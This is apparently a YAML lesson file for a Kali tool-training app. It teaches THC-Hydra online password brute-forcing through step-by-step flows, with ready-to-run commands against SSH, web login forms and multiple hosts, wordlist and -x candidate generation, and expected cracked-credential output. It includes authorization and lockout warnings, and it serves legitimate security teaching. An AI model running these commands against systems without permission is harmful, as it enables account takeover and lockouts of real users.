tool_id: hydra
display_name: "hydra (THC-Hydra)"
binary_candidates: [hydra]
categories: [password, exploitation]
os_profile: kali
one_liner: "Tries many username/password combos against a live login service."
authorization_gate: true
authorization_text: >
  Brute-forcing logins on systems you do not own or lack explicit written permission to
  test is illegal. hydra makes REAL login attempts — it can lock out accounts, flood logs,
  and trigger alerts/IPS. Confirm lockout policy first and pace with low -t + -w. Practice
  on your own lab VMs, Metasploitable, or DVWA. Continue?
flows:
  - flow_id: guided
    title: "Guided first attack (START HERE)"
    goal: "From an open login service to a found credential — safely paced, inputs explained."
    command_builder_id: hydra
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, OUTPUT_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: g1
        title: "Confirm the login service is open"
        slot_target: null
        glossary_refs: [service_module, online_vs_offline]
        explanation:
          what: "hydra attacks a LIVE service — SSH, FTP, RDP, a web login, etc. First confirm the service is actually listening on the target."
          why: "Every hydra guess is a real login attempt. Attacking a closed port just fails; and on real accounts, guessing can LOCK THEM OUT — know the lockout policy before you start."
          where: "The target host and the service name go at the END of the command."
        find_it: >
          Use the nmap tool to see which login services are open (22=ssh, 21=ftp, 3389=rdp,
          3306=mysql). Only test systems you own or are authorized to. If the target has an
          account-lockout policy (e.g. locks after 5 bad tries), brute-forcing can lock real
          users out — get explicit sign-off first.
        command_anatomy:
          - {token: "nmap", does: "the port scanner (see the nmap tool)"}
          - {token: "-p 22", does: "check port 22 (SSH)"}
          - {token: "192.168.1.10", does: "the target host"}
        try_this: "nmap -p 22 192.168.1.10"
        success_criteria: "The service shows as open (e.g. 22/tcp open ssh)."
        expected_output: |
          PORT   STATE SERVICE
          22/tcp open  ssh
        alternatives:
          - trigger: "the port is closed/filtered"
            cause: "That service isn't running, or it's on a different port."
            fix: "Scan more ports (`nmap -p- 192.168.1.10`) to find the real login service and port."
            check: "You have an open service + its port number."
      - step_id: g2
        title: "Prepare a username and a password list"
        slot_target: null
        glossary_refs: [password_list, rockyou]
        explanation:
          what: "hydra needs candidates: one or more USERNAMES and a list of PASSWORDS to try. Passwords usually come from a wordlist like rockyou."
          why: "The lists ARE the attack. A focused username plus a good password list is far more effective (and quieter) than everything-vs-everything."
          where: "Usernames go with -l/-L, passwords with -p/-P."
        find_it: >
          Usernames: make a small users.txt (one per line) from recon, or common ones like
          admin/root. Passwords: rockyou ships gzipped on Kali — unpack it once. See the
          Wordlists lesson for building targeted lists.
        command_anatomy:
          - {token: "printf 'admin\\nroot\\n' > users.txt", does: "create a 2-line username file"}
          - {token: "sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz", does: "unpack the rockyou password list (keeps the .gz)"}
        try_this: "printf 'admin\\nroot\\n' > users.txt && sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz && wc -l users.txt /usr/share/wordlists/rockyou.txt"
        success_criteria: "You have users.txt and an unpacked rockyou.txt (line counts print)."
        expected_output: |
          2 users.txt
          14344392 /usr/share/wordlists/rockyou.txt
        alternatives:
          - trigger: "rockyou.txt.gz already unpacked"
            cause: "You did it before."
            fix: "Fine — just use /usr/share/wordlists/rockyou.txt."
            check: "The file exists."
          - trigger: "rockyou is huge — too slow against a live service"
            cause: "14 million guesses over the network is impractical and noisy."
            fix: "Use a small top-100/top-1000 list against live services; save rockyou for OFFLINE hash cracking (john/hashcat)."
            check: "You pick a small list for online attacks."
      - step_id: g3
        title: "Test a single credential first"
        slot_target: POSITIONAL_ARGS
        glossary_refs: [login]
        explanation:
          what: "`-l admin -p <pass>` tries ONE username/password pair. -V prints each attempt so you can see it working."
          why: "Proving the syntax and service work with one guess avoids launching a huge run that fails for a silly reason."
          where: "-l/-p are options; the target and service come LAST as positionals."
        find_it: "Pick one username and one likely password. The service name is lowercase (ssh, ftp, rdp...)."
        command_anatomy:
          - {token: "hydra", does: "the program"}
          - {token: "-l admin", does: "try the single username 'admin' (lowercase L)"}
          - {token: "-p admin123", does: "try the single password 'admin123'"}
          - {token: "-V", does: "verbose — show every attempt"}
          - {token: "192.168.1.10", does: "the target host"}
          - {token: "ssh", does: "the service/protocol to attack"}
        try_this: "hydra -l admin -p admin123 -V 192.168.1.10 ssh"
        success_criteria: "hydra shows the attempt; on a correct pair it prints a green [22][ssh] ... login/password line."
        expected_output: |
          [ATTEMPT] target 192.168.1.10 - login "admin" - pass "admin123"
          [22][ssh] host: 192.168.1.10   login: admin   password: admin123
          1 of 1 target successfully completed, 1 valid password found
        alternatives:
          - trigger: "connection refused / could not connect"
            cause: "Service down, wrong port, or wrong service name."
            fix: "Confirm with nmap; if the port is non-standard add `-s <port>` (e.g. -s 2222)."
            check: "nmap shows the service open on that port."
          - trigger: "the single guess was wrong (no valid pair)"
            cause: "That password isn't right — expected."
            fix: "Move on to the list attack (next step)."
            check: "You proceed with lists."
      - step_id: g4
        title: "Run the list attack — paced to be safe"
        slot_target: ACTION_OPTIONS
        glossary_refs: [tasks, lockout]
        explanation:
          what: "`-L users.txt -P passwords.txt` tries each username against each password. `-t 4` keeps it to 4 parallel tries; `-f` stops at the first valid pair."
          why: "Low parallelism (-t 4) reduces the chance of lockouts and IPS alerts. -f saves time once you get in."
          where: "-L/-P/-t/-f are options; target + service stay last."
        find_it: "Use the users.txt and password list from step 2. Keep -t low (1-4) on anything with lockout; raise it only on a robust lab."
        command_anatomy:
          - {token: "-L users.txt", does: "try every username in this file (capital L)"}
          - {token: "-P /usr/share/wordlists/rockyou.txt", does: "try every password in this file (capital P)"}
          - {token: "-t 4", does: "only 4 parallel attempts (gentle — avoids lockouts)"}
          - {token: "-f", does: "stop as soon as one valid pair is found"}
          - {token: "192.168.1.10 ssh", does: "target host + service"}
        try_this: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f 192.168.1.10 ssh"
        success_criteria: "hydra reports a valid login/password pair (or exhausts the list)."
        expected_output: |
          [DATA] attacking ssh://192.168.1.10:22/
          [22][ssh] host: 192.168.1.10   login: admin   password: password1
          1 of 1 target successfully completed, 1 valid password found
        alternatives:
          - trigger: "the target rate-limits or blocks you"
            cause: "Too aggressive — the service is throttling or an IPS reacted."
            fix: "Slow right down: `-t 1 -w 30` (one try at a time, 30s wait). This is the 'careful' pace."
            check: "Attempts go through without being dropped."
          - trigger: "accounts got locked"
            cause: "You exceeded the lockout threshold."
            fix: "Stop. Loop users OUTSIDE passwords with -u, use a tiny password list, and respect the policy. Warn the owner."
            check: "You have authorization and a lockout-safe plan."
      - step_id: g5
        title: "Save any credentials you find"
        slot_target: OUTPUT_OPTIONS
        explanation:
          what: "`-o hits.txt` writes found credentials to a file."
          why: "You want a durable record of what worked — for the report and the next step."
          where: "OUTPUT_OPTIONS; -o names the file."
        find_it: "Choose a filename in a folder you own. Treat found credentials as sensitive — store and delete them responsibly."
        command_anatomy:
          - {token: "hydra -L users.txt -P ... -t 4 -f", does: "the paced list attack from step 4"}
          - {token: "-o ~/scans/hydra.txt", does: "save any found credentials to this file"}
          - {token: "192.168.1.10 ssh", does: "target + service"}
        try_this: "mkdir -p ~/scans && hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f -o ~/scans/hydra.txt 192.168.1.10 ssh"
        success_criteria: "~/scans/hydra.txt holds any credentials found (check with `cat`)."
        expected_output: |
          [22][ssh] host: 192.168.1.10   login: admin   password: password1
          $ cat ~/scans/hydra.txt
          [22][ssh] host: 192.168.1.10   login: admin   password: password1
        alternatives:
          - trigger: "the run got interrupted"
            cause: "You stopped it or lost connection."
            fix: "Resume where it left off with `hydra -R`."
            check: "It continues instead of restarting."
  - flow_id: single_test
    title: "Single credential test (reference)"
    goal: "Verify one credential pair works before any list."
    command_builder_id: hydra
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: hy1
        title: "Test one login/password"
        slot_target: POSITIONAL_ARGS
        glossary_refs: [service_module, login, online_vs_offline]
        explanation:
          what: "`-l <user> -p <pass>` then `<target> <service>`; -V shows attempts, -f stops on success."
          why: "hydra attacks a LIVE service — every guess is a real login. Cracking captured hashes offline is john/hashcat."
          where: "creds in ACTION_OPTIONS; target+service are POSITIONAL (last)."
        find_it: "One username, one password, the target host, and the lowercase service name."
        command_anatomy:
          - {token: "-l admin", does: "single username"}
          - {token: "-p admin123", does: "single password"}
          - {token: "-V -f", does: "verbose; stop on first success"}
          - {token: "192.168.1.10 ssh", does: "target + service (positional, last)"}
        try_this: "hydra -l admin -p admin123 -V -f 192.168.1.10 ssh"
        success_criteria: "hydra prints [ssh] host: ... login: admin password: admin123 on a hit."
        expected_output: |
          [22][ssh] host: 192.168.1.10   login: admin   password: admin123
        alternatives:
          - trigger: "connection refused / wrong port"
            cause: "Service down or non-standard port."
            fix: "Confirm the service with nmap; set -s <port> if non-standard."
            check: "nmap -p <port> the host first."
          - trigger: "no valid pair"
            cause: "The single guess was wrong."
            fix: "Move to username/password lists."
            check: "Switch to the lists flow."
  - flow_id: lists
    title: "Username list × password list (reference)"
    goal: "Try many users against many passwords."
    command_builder_id: hydra
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: hy2
        title: "Use -L and -P lists"
        slot_target: ACTION_OPTIONS
        glossary_refs: [password_list]
        explanation:
          what: "`-L users.txt -P passwords.txt` tries each combination."
          why: "Covers more ground; -f stops at the first valid pair."
          where: "ACTION_OPTIONS (creds come before the positional target)."
        find_it: "A users.txt and a password list; keep them small first."
        command_anatomy:
          - {token: "-L users.txt", does: "username list"}
          - {token: "-P passwords.txt", does: "password list"}
          - {token: "-V -f", does: "verbose; stop on first hit"}
        try_this: "hydra -L users.txt -P passwords.txt -V -f 192.168.1.10 ssh"
        success_criteria: "Any valid pair(s) reported."
        expected_output: |
          [22][ssh] host: 192.168.1.10   login: admin   password: hunter2
        alternatives:
          - trigger: "very slow / many users"
            cause: "Large lists × high parallelism."
            fix: "Lower -t and keep lists small first; -u loops users outer for lockout-sensitive targets."
            check: "Re-run with -t 4."
  - flow_id: wordlists_tune
    title: "Real wordlists + tuning tasks (reference)"
    goal: "Use rockyou-style lists; control parallelism."
    command_builder_id: hydra
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: hy3
        title: "rockyou + -t tuning"
        slot_target: GLOBAL_OPTIONS
        glossary_refs: [rockyou, tasks, lockout]
        explanation:
          what: "rockyou ships gzipped: `sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz`; -t sets parallel tasks (default 16)."
          why: "Lower -t for stability and to reduce lockouts/noise; raise only on robust labs."
          where: "GLOBAL_OPTIONS (-t)."
        find_it: "Unpack rockyou once; choose -t based on how robust/lockout-safe the target is."
        command_anatomy:
          - {token: "-P /usr/share/wordlists/rockyou.txt", does: "the big password list"}
          - {token: "-t 4", does: "4 parallel tasks (default is 16 — lower is gentler)"}
        try_this: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -V 192.168.1.10 ssh"
        success_criteria: "The run proceeds at a sane rate; hits reported."
        expected_output: |
          [DATA] max 4 tasks per 1 server, overall 4 tasks
          [22][ssh] host: 192.168.1.10   login: admin   password: iloveyou
        alternatives:
          - trigger: "target rate-limits / blocks you"
            cause: "Too aggressive for the target."
            fix: "Drop to -t 1 -w 30 (the Careful profile)."
            check: "Watch for lockouts; slow down."
  - flow_id: http_form
    title: "HTTP login form (reference)"
    goal: "Brute a web login form correctly."
    command_builder_id: hydra
    slots: [PROGRAM, ACTION_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: hy4
        title: "Build the form string"
        slot_target: POSITIONAL_ARGS
        glossary_refs: [http_post_form]
        explanation:
          what: "Form modules need 3 colon parts: \"<path>:<body with ^USER^/^PASS^>:<failure marker>\" (F=fail or S=success)."
          why: "^USER^/^PASS^ mark injection points; the failure marker tells hydra what 'wrong' looks like."
          where: "service + form string are POSITIONAL (last)."
        find_it: >
          Submit a WRONG login in your browser with dev tools open (Network tab). Note the form's
          path, the POST body field names, and the exact error message shown on failure — those
          three become the colon-separated parts.
        command_anatomy:
          - {token: "http-post-form", does: "the service module for a POST login form"}
          - {token: "/login.php", does: "part 1 — the form's path"}
          - {token: "user=^USER^&pass=^PASS^", does: "part 2 — POST body; ^USER^/^PASS^ are where guesses go"}
          - {token: "F=Invalid credentials", does: "part 3 — text that appears when a login FAILS"}
        try_this: "hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials\""
        success_criteria: "A valid pair is reported."
        expected_output: |
          [80][http-post-form] host: 192.168.1.10   login: admin   password: letmein
        alternatives:
          - trigger: "every attempt shows wrongly as success/failure"
            cause: "Failure/success marker is off."
            fix: "Capture a real failed login (browser/Burp) and copy the exact message."
            check: "Compare your F= text to the real failure page."
          - trigger: "CSRF token required"
            cause: "Per-request tokens aren't handled by a simple form string."
            fix: "Needs token-tracking tooling; note and consult docs."
            check: "Inspect the form for a hidden token."
  - flow_id: extras
    title: "Extra tries & combo lists (reference)"
    goal: "Cheap wins and user:pass files."
    command_builder_id: hydra
    slots: [PROGRAM, ACTION_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: hy5
        title: "-e nsr and -C combos"
        slot_target: ACTION_OPTIONS
        glossary_refs: [null_login, combo_list]
        explanation:
          what: "`-e nsr` adds null password, same-as-login, reversed-login; `-C user:pass.txt` uses a combo file."
          why: "Catches trivial credentials fast; combo files replace -L+-P."
          where: "ACTION_OPTIONS (-C); -e in GLOBAL_OPTIONS."
        find_it: "-e nsr needs no extra input; -C needs a file of user:pass lines."
        command_anatomy:
          - {token: "-e nsr", does: "also try: null password, password=username, reversed username"}
          - {token: "-C user:pass.txt", does: "(alternative) a file of user:pass pairs, one per line"}
        try_this: "hydra -L users.txt -e nsr 192.168.1.10 ssh"
        success_criteria: "Trivial credentials (if present) are found."
        expected_output: |
          [22][ssh] host: 192.168.1.10   login: admin   password: admin
        alternatives:
          - trigger: "no extra hits"
            cause: "No trivial credentials in use."
            fix: "Proceed with a real password list."
            check: "Move to the wordlist flow."
  - flow_id: output_resume
    title: "Output, resume & stop-on-success (reference)"
    goal: "Save hits and resume interrupted runs."
    command_builder_id: hydra
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, OUTPUT_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: hy6
        title: "Save hits; resume with -R"
        slot_target: OUTPUT_OPTIONS
        explanation:
          what: "`-o found.txt` saves hits (`-b json` format); `-f` stop per host, `-F` global; `-R` resumes."
          why: "Keep results and continue an aborted session without starting over."
          where: "OUTPUT_OPTIONS (-o/-b)."
        find_it: "A writable output path; -R needs the leftover hydra.restore file from a prior run."
        command_anatomy:
          - {token: "-o hits.txt", does: "save found credentials to this file"}
          - {token: "-f", does: "stop this host on first success"}
          - {token: "-R", does: "(separate run) resume the previous session"}
        try_this: "hydra -L users.txt -P rockyou.txt -o hits.txt -f 192.168.1.10 ssh"
        success_criteria: "hits.txt holds any found credentials."
        expected_output: |
          [22][ssh] host: 192.168.1.10   login: admin   password: password1
          (written to hits.txt)
        alternatives:
          - trigger: "interrupted mid-run"
            cause: "Session aborted."
            fix: "Resume with `hydra -R`."
            check: "Re-run with -R."
  - flow_id: multi_target
    title: "Multiple targets (reference)"
    goal: "Run against many hosts at once."
    command_builder_id: hydra
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, OUTPUT_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: hy7
        title: "Use -M targets file"
        slot_target: ACTION_OPTIONS
        explanation:
          what: "`-M targets.txt` runs against many hosts; combine with -o for one result file."
          why: "Pace carefully (low -t) to avoid hammering many hosts."
          where: "ACTION_OPTIONS (-M replaces the positional target)."
        find_it: "A targets.txt with one host per line; the service name still goes last."
        command_anatomy:
          - {token: "-M targets.txt", does: "attack every host listed in this file"}
          - {token: "-o hits.txt", does: "consolidate all hits into one file"}
          - {token: "ssh", does: "the service (no single positional host when using -M)"}
        try_this: "hydra -L users.txt -P passwords.txt -M targets.txt -o hits.txt ssh"
        success_criteria: "Consolidated hits across hosts in hits.txt."
        expected_output: |
          [22][ssh] host: 192.168.1.10   login: admin   password: password1
          [22][ssh] host: 192.168.1.11   login: root    password: toor
        alternatives:
          - trigger: "too much load"
            cause: "Many hosts × high -t."
            fix: "Lower -t and consider batching the target list."
            check: "Reduce parallelism."
  - flow_id: bruteforce_generation
    title: "Password bruteforce GENERATION with -x (reference)"
    goal: "Generate password candidates from a charset/length range instead of a wordlist."
    command_builder_id: hydra
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, POSITIONAL_ARGS]
    steps:
      - step_id: hy8
        title: "Understand -x: GENERATE candidates, don't read them from a file"
        slot_target: ACTION_OPTIONS
        glossary_refs: [bruteforce_generation, password_list]
        explanation:
          what: "`-x MIN:MAX:CHARSET` tells hydra to build every possible password itself, from MIN to MAX characters long, using only the character classes you specify — 'a' lowercase, 'A' uppercase, '1' digits, plus any literal symbols you type. It replaces -p/-P/-C entirely; hydra never reads a password file in this mode."
          why: "A wordlist (-P) only tries passwords someone already thought of. -x is for when you know the SHAPE of the password (e.g. 'a 4-digit PIN' or 'a 6-character lowercase code') but it wouldn't be in any wordlist — hydra exhaustively covers that shape instead of guessing from a list."
          where: "ACTION_OPTIONS, in place of -p/-P/-C."
        find_it: >
          Decide the shape from context: a PIN pad implies digits only (CHARSET '1'); a
          short device default password might be lowercase letters only ('a'). Keep MAX-MIN
          small — the keyspace (character_count ^ length) grows FAST, and every guess here is a
          real network request, unlike offline hashcat/john brute force.
        command_anatomy:
          - {token: "hydra -l admin", does: "single known username (or -L for a list)"}
          - {token: "-x 4:4:1", does: "generate every 4-digit numeric password: 0000 through 9999 (10,000 candidates)"}
          - {token: "-V", does: "verbose — watch it work"}
          - {token: "192.168.1.10 ssh", does: "target + service, same as any hydra run"}
        try_this: "hydra -l admin -x 4:4:1 -V 192.168.1.10 ssh"
        success_criteria: "hydra generates and tries 4-digit numeric candidates (0000, 0001, 0002...) instead of reading a password file."
        expected_output: |
          [DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries
          [ATTEMPT] target 192.168.1.10 - login "admin" - pass "0000"
          [ATTEMPT] target 192.168.1.10 - login "admin" - pass "0001"
          [22][ssh] host: 192.168.1.10   login: admin   password: 4821
        alternatives:
          - trigger: "it's taking forever / huge number of tries reported"
            cause: "The keyspace is too big — e.g. -x 4:8:aA1 mixes 62 characters across up to 8 positions, which is billions of combinations."
            fix: "Narrow it: shrink MAX, or use only ONE character class (just '1' for digits, or just 'a' for lowercase) if you have any reason to believe that's the shape."
            check: "The '[DATA] ... N login tries' line at the start — sanity-check N before letting it run."
          - trigger: "you don't actually know the password shape"
            cause: "-x is only efficient when you have a real reason to believe the password fits a narrow pattern."
            fix: "Go back to a wordlist attack (-P) instead — broader coverage of REAL passwords people use, for the same or less time."
            check: "Compare: is there a wordlist that already covers what you're guessing at?"
      - step_id: hy9
        title: "Combine -x with a username list, and know what it implies"
        slot_target: GLOBAL_OPTIONS
        explanation:
          what: "-x works with -L (multiple usernames) too. hydra AUTOMATICALLY loops usernames on the outside when -x is active (equivalent to always adding -u), because regenerating the whole candidate keyspace per user would be wasteful."
          why: "Knowing this matters for reading progress output and estimating runtime — with N usernames and K generated candidates, expect roughly N x K total attempts, reported up front."
          where: "GLOBAL_OPTIONS; -u is implied, you don't add it yourself."
        find_it: "Reuse a users.txt from an earlier step; keep the -x range narrow so N x K stays reasonable."
        command_anatomy:
          - {token: "-L users.txt", does: "try every username in this file"}
          - {token: "-x 4:4:1", does: "against every 4-digit numeric password"}
        try_this: "hydra -L users.txt -x 4:4:1 -V 192.168.1.10 ssh"
        success_criteria: "hydra reports total tries as (usernames x candidates) and works through them."
        expected_output: |
          [DATA] max 16 tasks per 1 server, overall 16 tasks, 30000 login tries (dep: none), ~1875 tries per task
        alternatives:
          - trigger: "way more tries than expected"
            cause: "Forgot it multiplies by every username in the list."
            fix: "Cut the username list down to the most likely candidates first, or narrow -x further."
            check: "Check the reported total tries before committing to a long run."

quick_build:
  builder: hydra
  title: "Quick attack"
  fields:
    - field_id: profile
      label: "Profile"
      type: choice
      choices: [single, targeted, standard, careful]
      help: "Preset pacing (tasks/verbose/wait). 'careful' is slowest but safest against lockouts. Leave blank to set tuning yourself below."
    - field_id: resume
      label: "Resume previous session (-R)"
      type: bool
      help: "Ignores everything else and continues an aborted run from its hydra.restore file."
    - field_id: target
      label: "Target host"
      type: string
      placeholder: "10.0.0.5"
    - field_id: service
      label: "Service"
      type: choice
      required: true
      default: ssh
      choices: [ssh, ftp, smb, rdp, mysql, http-post-form]
    - field_id: port
      label: "Non-standard port (-s)"
      type: int
      placeholder: "2222  (optional — only if not the default port)"
    - field_id: login
      label: "Username (single)"
      type: string
      placeholder: "admin"
    - field_id: login_list
      label: "Username list"
      type: path
      placeholder: "users.txt  (instead of single)"
    - field_id: password
      label: "Password (single)"
      type: string
      placeholder: "admin123  (for a one-off test)"
    - field_id: password_list
      label: "Password list"
      type: path
      placeholder: "/usr/share/wordlists/rockyou.txt"
    - field_id: combo
      label: "Combo file (-C, user:pass pairs)"
      type: path
      placeholder: "combos.txt  (replaces username + password list above)"
      help: "A file of 'user:pass' lines, one pair per line — an alternative to separate username/password lists."
    - field_id: bruteforce
      label: "Generate passwords instead of a list (-x MIN:MAX:CHARSET)"
      type: string
      placeholder: "4:6:a1  (optional — e.g. 4-6 chars, lowercase+digits)"
      help: "Advanced: instead of trying passwords FROM a file, hydra GENERATES every combination in this length/charset range. Replaces the password fields above. See the 'Bruteforce generation' flow before using this."
    - field_id: http_form
      label: "HTTP form string"
      type: string
      placeholder: "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
      help: "Only for http-post-form / http-get-form services: path, POST body with ^USER^/^PASS^, and the text that appears on a FAILED login."
    - field_id: module_opts
      label: "Module-specific options (-m)"
      type: string
      placeholder: "optional — see hydra -U <service> for what a module accepts"
    - field_id: ssl
      label: "Force explicit SSL/TLS (-S)"
      type: bool
      help: "Use when a plain service (e.g. telnet, ftp) is actually running over TLS on that port."
    - field_id: tasks
      label: "Parallel tasks (-t)"
      type: int
      placeholder: "4"
    - field_id: wait
      label: "Wait time between attempts, seconds (-w)"
      type: int
      placeholder: "30  (higher = gentler, avoids lockouts)"
    - field_id: extra_tries
      label: "Extra trivial guesses (-e)"
      type: string
      placeholder: "nsr  (n=null pass, s=pass=login, r=reversed login)"
    - field_id: verbose
      label: "Verbose — show every attempt (-V)"
      type: bool
    - field_id: stop_on_success
      label: "Stop this host on first hit (-f)"
      type: bool
    - field_id: stop_global
      label: "Stop entire run on first hit anywhere (-F)"
      type: bool
      help: "Only useful with multiple targets — stops the whole attack, not just one host."
    - field_id: targets_file
      label: "Multiple targets file (-M)"
      type: path
      placeholder: "targets.txt  (instead of a single Target host)"
    - field_id: output
      label: "Save found credentials to file (-o)"
      type: path
      placeholder: "~/scans/hydra.txt"
    - field_id: output_format
      label: "Output format (-b)"
      type: choice
      choices: [text, json, jsonv1]
      help: "Only applies with Output file set above."
